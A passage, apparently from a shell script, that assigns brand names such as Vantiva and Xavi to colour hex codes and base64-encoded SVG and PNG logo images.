jEwOSAtMC4yNjEsMC4wNzIgLTAuNDg3LDAuMTgxIC0wLjY4LDAuMzMxIC0wLjE5MywwLjE0OSAtMC4zNDYsMC4zNDEgLTAuNDYyLDAuNTc0IC0wLjExNSwwLjIzNSAtMC4xNzYsMC41MSAtMC4xODEsMC44MjggeiIgLz48L2c+PGcKICAgICAgICAgICB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxMTIuMjgwNiwzOC4yOTMyKSIKICAgICAgICAgICBpZD0iZzEzNiI+PHBhdGgKICAgICAgICAgICAgIGlkPSJwYXRoMTM4IgogICAgICAgICAgICAgc3R5bGU9ImZpbGw6IzRmNGM0ZDtmaWxsLW9wYWNpdHk6MTtmaWxsLXJ1bGU6bm9uemVybztzdHJva2U6bm9uZSIKICAgICAgICAgICAgIGQ9Ik0gMCwwIEggMC4zMTEgQyAwLjU3NSwwIDAuODE2LDAuMDEzIDAuODE2LDAuMzE2IDAuODE2LDAuNTcxIDAuNTk3LDAuNjEgMC4zOTUsMC42MSBIIDAgWiBtIC0wLjI5OCwwLjg1MiBoIDAuNzQyIGMgMC40NTYsMCAwLjY3MSwtMC4xOCAwLjY3MSwtMC41NDkgMCwtMC4zNDcgLTAuMjIsLTAuNDkyIC0wLjUwNSwtMC41MjIgTCAxLjE1OSwtMS4wNjcgSCAwLjgzOCBMIDAuMzE2LC0wLjI0MSBIIDAgdiAtMC44MjYgaCAtMC4yOTggeiBtIDAuNjQsLTIuMzYyIGMgMC43NiwwIDEuMzQ3LDAuNjA2IDEuMzQ3LDEuNDA5IDAsMC43ODYgLTAuNTg3LDEuMzkxIC0xLjM0NywxLjM5MSAtMC43NjgsMCAtMS4zNTYsLTAuNjA1IC0xLjM1NiwtMS4zOTEgMCwtMC44MDMgMC41ODgsLTEuNDA5IDEuMzU2LC0xLjQwOSBtIDAsMy4wNDEgYyAwLjg5NiwwIDEuNjQ2LC0wLjcwNiAxLjY0NiwtMS42MzIgMCwtMC45NDQgLTAuNzUsLTEuNjUgLTEuNjQ2LC0xLjY1IC0wLjksMCAtMS42NTQsMC43MDYgLTEuNjU0LDEuNjUgMCwwLjkyNiAwLjc1NCwxLjYzMiAxLjY1NCwxLjYzMiIgLz48L2c+PC9nPjwvZz48L2c+PC9zdmc+'
										["Vantiva"]='#FFFFFF #E70000 #696969 data:image/png;base64,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'
										["Xavi"]='#03329A #5B5B5B #6487DB data:image/svg+xml;base64,DQo8c3ZnIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgd2lkdGg9IjEwMDAiIGhlaWdodD0iMTAwMCIgdmlld0JveD0iMCAwIDE5Mi43NTYgMTkyLjc1NiI+PGcgZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiPjxwYXRoIGZpbGw9IiNmZmYiIGZpbGwtb3BhY2l0eT0iMCIgZD0iTTAgMGgxOTIuNzU2djE5Mi43NTZIMFYweiIvPjxwYXRoIGQ9Ik0yMC40MTEgMTI0LjgxOGMuNzQ0LTMuMjk0IDEuMzgyLTYuNjk3IDIuNTUxLTkuODg3IDIuNTUyLTYuMTY3IDUuOTU0LTExLjA1OSAxMC4yMDgtMTYuMTYxIDIuOTc3LTIuOTc3IDUuODQ4LTUuNjM2IDkuMDM4LTguMjk0IDIuMzM4LTEuNDg3IDQuNTcyLTIuOTc3IDYuOTEtNC4zNTkgMi4zNDEtMS4yNzQgNC42OC0yLjMzOSA3LjEyNC0zLjQwMmExNTIuMDA0IDE1Mi4wMDQgMCAwIDEgNy4zMzYtMi4zMzljMS45MTUtLjMxOCAzLjgyOC0uNjM5IDUuODQ5LS43NDQtMS44MDgtLjUzMS02LjE2Ny0uOTU3LTcuMDE4LS45NTctMi40NDYgMC00LjY3OS4xMDUtNy4wMTguMzE4LTIuNTUxLjUzMy00Ljg5IDEuMDY0LTcuMzM2IDEuODA4LTMuODI1IDEuMzgyLTcuMzM1IDIuODctMTAuOTUgNC43ODQtMi4zMzkgMS4zODItNC41NzIgMi44NzItNi45MTEgNC40NjctMi4xMjggMS43LTQuMTQ2IDMuNTA4LTYuMjc0IDUuNDItMS44MDUgMS45MTYtMy42MTIgMy45MzYtNS4zMTUgNi4wNjFhODYuMzY0IDg2LjM2NCAwIDAgMC02LjI3MSA5Ljg4OGMtMS45MTUgNC41NzEtMy4wODQgOC41MDctMy44MjggMTMuMzk2bDExLjkwNS4wMDF6TTE1Mi4wMzcgMTEyLjI3MnYtMi43NjRjLjQyNi45NTYuODUyIDEuOTEzIDEuMjc1IDIuNzY0aC0xLjI3NXptMC0yMS40NzZjMi4zMzggNS4yMSA0LjQ2NyAxMC42MyA2LjkxIDE1LjczNi44NTIgMi4xMjUgMS41OTYgNC4wNCAyLjIzMiA1Ljc0LjYzOS0uMTA1IDEuNDktLjEwNSAyLjEyNy0uMTA1Ljc0NCAwIDEuNDg4LjEwNSAyLjIzMi4xMDUuNjM5LTIuMDIxIDEuMzgzLTQuMTQ2IDIuMjM0LTYuMDU5bDUuNDIyLTEyLjQ0YTE1Mi4yOCAxNTIuMjggMCAwIDEgMi45NzktNS45NTRjLS43NDQuMTA1LTEuNTk2LjIxMy0yLjQ0Ny4yMTMtLjc0NCAwLTEuNDg2LS4xMDctMi4yMzItLjIxMy0uMzE4IDEuNDg3LS44NSAyLjg3LTEuMzgzIDQuMjUxbC00Ljg5MSAxMi41NDktNS4yMDktMTIuNDRjLS42MzktMS4zODItMS4wNjQtMi44NzItMS40OS00LjM1OS0xLjE2OC4xMDUtMi4zMzguMjEzLTMuNjExLjIxMy0uOTYxIDAtMS45MTYgMC0yLjg3My0uMTA3djIuODd6bTI1LjUxOCAyMS40NzZjLjEwNS0uNjM4LjIxMy0xLjM4Mi4yMTMtMi4yMzIuMTA1LTIuNjU5LjEwNS01LjIxMS4xMDUtNy44NjcgMC0xLjgwOC0uMTA1LTMuMjk1LS4xMDUtNC4zNTgtLjEwNy0xLjA2NC0uMjEzLTIuMTI5LS4zMi0yLjk3OC43NDYuMTA1IDEuMjc1LjEwNSAxLjkxNi4yMTFoMi45NzZjLjYzOS0uMTA1IDEuMjczLS4xMDUgMS45MTItLjIxMS0uMTA1Ljg0OS0uMjEzIDEuNy0uMzE4IDIuNTUyLS4xMDcgMS40ODktLjEwNyAyLjk3Ny0uMTA3IDQuNTcxLjEwNyAxLjQ4Ny4xMDcgMi45NzcuMTA3IDQuNDY1djMuNjE1Yy4xMDUuODUxLjEwNSAxLjU5NS4zMTggMi4yMzJoLTEuNDg4Yy0uOTU1LS4xMDUtMS41OTQtLjEwNS0xLjkxNC0uMTA1LS40MjYgMC0xLjE3IDAtMi4zMzguMTA1aC0uOTU3em0uMTA1LTIzLjYwMmMwLS44NTEuMzItMS41OTUuOTU5LTIuMTI3LjUzMS0uNTMxIDEuMzc5LS44NSAyLjIzLS44NS45NTkgMCAxLjcwMy4zMTggMi4zNDIuODUuNjM1LjUzMy44NDggMS4yNzYuODQ4IDIuMTI3IDAgLjc0NC0uMzE4IDEuNDg4LS45NTcgMi4wMTktLjYzNy41MzMtMS4zODEuODUxLTIuMjMyLjg1MXMtMS42OTktLjMxOC0yLjIzLS44NTFhMi42MTIgMi42MTIgMCAwIDEtLjk2LTIuMDE5em0tMjUuNjIzLS43NDV2Mi44NzJhMzQuNDM1IDM0LjQzNSAwIDAgMC0xLjE2OC0yLjk3N2MuNDI0LjEwNS43NDIuMTA1IDEuMTY4LjEwNXptMCAyMS41ODRjLTMuMTg5LTcuMjMtNi4yNzMtMTQuNjcyLTkuMDM3LTIyLjExNS0uNzQ0IDAtMS4zODMuMTA1LTIuMDIxLjEwNS0uNjM3IDAtMS4yNzMtLjEwNS0xLjkxMi0uMTA1djcuNTQ4YzEuMTY4IDIuNDQ2IDIuMjMyIDQuOTk3IDMuMDg0IDcuNTQ5aC0zLjA4NHYyLjg3MWMxLjM4MSAwIDIuNzY0IDAgNC4xNDYuMTA1Ljc0MiAyLjIzMyAxLjU5NCA0LjU3MiAyLjM0IDYuODA1IDEuMzgzIDAgMi42NTYtLjEwNSAzLjkzNC0uMTA1Ljg1MiAwIDEuNjk5LjEwNSAyLjU1MS4xMDV2LTIuNzYzaC0uMDAxem0tMjMuMjg1LTIxLjY5di4xMDUtLjEwNXptMCAyMy45MjNsLjMxOC40MjVoLS4zMTh2LS40MjV6bTEwLjMxNC0yNC4zNDhoLS4xMDVjLTEuNTk2IDQuMTQ2LTMuNDAyIDguMjkyLTUuMjExIDEyLjQ0MS0xLjcwMSAzLjkzMy0zLjI5NyA3LjEyMi00Ljk5OCAxMC42M3YxLjE3bC4zMTguNTMyYzEuMDY0LjEwNSAyLjAyMSAwIDIuOTc5LjEwNWE3NC43MDYgNzQuNzA2IDAgMCAwIDIuNTUzLTYuODA1YzEuNDg2IDAgMi44NjktLjEwNSA0LjM1OS0uMTA1aC4xMDV2LTIuODcxaC0zLjE5MWMuOTU3LTIuNTUyIDIuMDIxLTQuOTk4IDMuMTkxLTcuNTQ5di03LjU0OHpNMTA2IDExMi4yNzJhNDYyLjczOSA0NjIuNzM5IDAgMCAwIDguODI0LTExLjM3N2wtOC4yOTEtMTMuMDc2YzEuMzgxLjEwNSAyLjY1Ni4yMTMgNC4wMzkuMjEzIDEuMzgxIDAgMi43NjQtLjEwNyA0LjE0OC0uMjEzIDEuMjczIDIuNzY0IDIuODY5IDUuMjEgNC4zNTcgNy43NjIgMS43MDEtMi40NDYgMy40LTUuMTA1IDQuODkxLTcuNzYyLjc0NC4xMDUgMS41OTYuMjEzIDIuMzM4LjIxMy44NTIgMCAxLjU5Ni0uMTA3IDIuNDQ1LS4yMTN2LjEwNWMtMi44NzEgMy4yOTctNS40MjIgNi45MTItOC4wOCAxMC40Mmw4LjA4IDEzLjM5N3YuNDI1aC0zLjkzMmMtLjMyIDAtMS40OSAwLTMuNTEyLjEwNWgtLjIxM2MtMS4yNzMtMi45NzctMi45NzUtNS42MzYtNC42NzYtOC41MDUtMS45MTIgMi43NjUtMy43MjMgNS42MzQtNS4zMTYgOC41MDUtLjk1NyAwLTEuOTE0LS4xMDUtMi44NzEtLjEwNS0uNzQzLjAwMS0xLjQ4Ny4wMDEtMi4yMzEuMTA2em0yMi43NTItMS44MDdjLS4xMDQuMjEzLS4yMTMuNDI2LS4zMTYuNjM5bC4zMTYuNTMxdi0xLjE3eiIgZmlsbD0iIzM0NjRhNiIvPjxwYXRoIGQ9Ik0xOC43MTEgNzkuMzEyYy0xLjkxNSAwLTMuOTM2LjEwNy01Ljk1Ni4xMDctMS4xNjkgNC41NzItMi4wMTkgOC4wOC0xLjkxMyAxMi44NjQuNDI2IDQuMTQ4IDEuMzgyIDcuOTc1IDQuMjU0IDExLjE2NCAxLjgwOC0yLjg2OSA0LjA0MS01LjUyOCA3LjY1My04LjkzLTEuOTEyLTUuOTU0LjQyNi0xMS4yNyAxLjkxNS0xNS4zMTEtMS45MTQuMTA2LTMuOTMyLjEwNi01Ljk1My4xMDZ6bTc3LjQwMiAzNC4zNDNIODQuMDk3YzEuODA4LTUuMzE1IDIuNjU5LTExLjA1OSAxLjcwMy0xNi42OTItNy4zMzggNi42OTctMTUuNTI1IDExLjgwMi0yNC45ODYgMTUuMDk3YTUyLjc5IDUyLjc5IDAgMCAxLTEwLjg0MyAyLjAyMWMtMi4yMzMuMTA1LTQuNDY3LjEwNS02LjgwNS0uMTA4YTE1OC41NDcgMTU4LjU0NyAwIDAgMS0zLjA4NC0uNjM2Yy00LjU3Mi0xLjI3Ny03LjU0OS0zLjA4NS0xMC44NDQtNi43LTEuMDY0IDEuNzAzLTIuMTI4IDMuNDAzLTIuOTc4IDUuMzE4IDQuMTQ3IDEuNTkzIDcuNTQ5IDEuNyAxMi4wMTQgMS40ODdhNzQuMTk0IDc0LjE5NCAwIDAgMCA3LjAxOC0uOTU3YzE1LjUyMy0yLjk3NyAyOC43MDctMTMuNzE1IDM1LjgzLTI1LjQxLTMuMDgzLTMuODI4LTcuMjMtNS44NDgtMTEuNjk0LTcuNDQzIDQuMjUzLS43NDQgMTAuODQzIDAgMTQuNzc4IDEuODA4IDIuMzM5LTQuMzU5IDMuNTA4LTguNjEzIDQuMjUyLTE